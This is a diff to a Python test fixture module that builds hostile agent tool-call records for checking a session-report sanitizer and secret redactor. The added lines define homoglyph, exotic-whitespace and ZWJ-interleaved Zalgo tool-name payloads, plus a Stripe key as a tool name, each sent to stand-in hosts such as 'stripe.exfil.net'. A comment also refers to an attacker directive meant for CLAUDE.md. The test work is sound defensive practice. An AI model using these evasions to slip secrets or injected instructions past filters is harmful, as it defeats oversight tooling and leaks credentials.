@@ -5,7 +5,7 @@ from __future__ import annotations
 import json
 
 from dogfood.mock_hostile_server import (
-    ANTHROPIC_KEY, AWS_ACCESS_KEY, DB_URL, RSA_KEY,
+    ANTHROPIC_KEY, AWS_ACCESS_KEY, DB_URL, RSA_KEY, STRIPE_KEY,
 )
 
 # An agent-instruction directive an attacker wants pasted into CLAUDE.md.
@@ -49,6 +49,23 @@ BIDI_NAME_PAYLOAD = f"admin{_RLO}gpj.exe"
 _ZWJ = "‍"
 ZWJ_NAME_PAYLOAD = f"ex{_ZWJ}filtrate"
 
+# Fullwidth Latin "system" (U+FF53 U+FF59 U+FF53 U+FF54 U+FF45 U+FF4D).
+# NFKC-folds to ASCII "system" but is NOT in the curated _HOMOGLYPHS set,
+# so it reaches session.html un-revealed before the fix.
+FULLWIDTH_NAME_PAYLOAD = "ｓｙｓｔｅｍ"
+# Mathematical bold lowercase "system" (U+1D42C–U+1D431). Another NFKC
+# homoglyph the report neutralizer misses.
+MATH_NAME_PAYLOAD = "𝐬𝐲𝐬𝐭𝐞𝐦"
+# Exotic whitespace: NBSP (U+00A0), ideographic space (U+3000), line/paragraph
+# separators (U+2028/U+2029). None are _SAFE_WS nor Cc/Cf, so they pass through.
+_EXOTIC_WS = "\u00a0\u3000\u2028\u2029"
+EXOTIC_WS_NAME_PAYLOAD = f"exfil{_EXOTIC_WS}trate"
+# Zero-width joiner interleaved between combining marks resets the Zalgo
+# run counter; each mark survives individually and the stack still overflows.
+_ZWJ = "‍"
+_ZALGO_MARK = "\u0300"  # combining grave
+ZALGO_INTERLEAVE_PAYLOAD = "tool_e" + _ZWJ.join([_ZALGO_MARK] * 60)
+
 PAYLOADS = {
     "directive": DIRECTIVE_PAYLOAD,
     "fence": END_MARKER_PAYLOAD,
@@ -64,6 +81,7 @@ SECRETS = {
     "db_url": DB_URL, "rsa": RSA_KEY,
     "github_token_tool": SECRET_TOOL_NAME,
     "github_token_filename": SECRET_FILENAME[:-3],  # token part of filename
+    "stripe": STRIPE_KEY,
 }
 
 
@@ -161,6 +179,17 @@ def hostile_report_lines() -> list[str]:
                        "result": {"content": [{"type": "text",
                                                "text": SCRIPT_RESULT_PAYLOAD}],
                                   "isError": True}}),
+        # R11: NFKC homoglyphs (fullwidth / mathematical Latin) in tool name.
+        _call(24, FULLWIDTH_NAME_PAYLOAD, {"url": "https://fullwidth.exfil.net/r11"}),
+        _call(25, MATH_NAME_PAYLOAD, {"url": "https://math.exfil.net/r11"}),
+        # R12: exotic whitespace (NBSP, ideographic space, line/paragraph sep).
+        _call(26, EXOTIC_WS_NAME_PAYLOAD, {"url": "https://ws.exfil.net/r12"}),
+        # R13: ZWJ-interleaved combining marks defeat the run-length counter.
+        _call(27, ZALGO_INTERLEAVE_PAYLOAD, {"url": "https://zalgo2.exfil.net/r13"}),
+        # R14: a novel credential shape (Stripe key) used as the tool name.
+        # It rides into the report via the tool-name chip / event label and into
+        # SARIF via the annotation explanation; only a new PII pattern can redact it.
+        _call(28, STRIPE_KEY, {"url": "https://stripe.exfil.net/r14"}),
     ]
 
 
@@ -182,6 +211,14 @@ def zalgo_report_lines() -> list[str]:
     """A tool call whose NAME carries a Zalgo combining-mark stack."""
     return _handshake() + [
         _call(6, ZALGO_NAME_PAYLOAD, {"url": "https://zalgo.exfil.net/z"}),
+    ]
+
+
+def zalgo_interleave_report_lines() -> list[str]:
+    """A tool call whose NAME interleaves combining marks with zero-width
+    joiners, defeating a naive consecutive-run counter."""
+    return _handshake() + [
+        _call(6, ZALGO_INTERLEAVE_PAYLOAD, {"url": "https://zalgo2.exfil.net/r13"}),
     ]
 
 
